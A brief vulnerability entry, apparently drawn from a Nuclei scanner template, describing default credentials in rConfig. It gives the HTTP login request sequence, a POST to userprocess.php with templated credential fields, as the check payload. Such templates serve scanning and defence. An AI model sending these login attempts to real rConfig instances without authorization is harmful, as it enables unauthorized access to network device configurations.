# Vulnerability: rConfig - Default Login
**Classification:** RCONFIG
**Source:** Nuclei Template (`rconfig-default-login.yaml`)

## Description
rConfig contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /login.php HTTP/1.1
Host: {{Hostname}}

POST /lib/crud/userprocess.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&pass={{password}}&sublogin=1
```

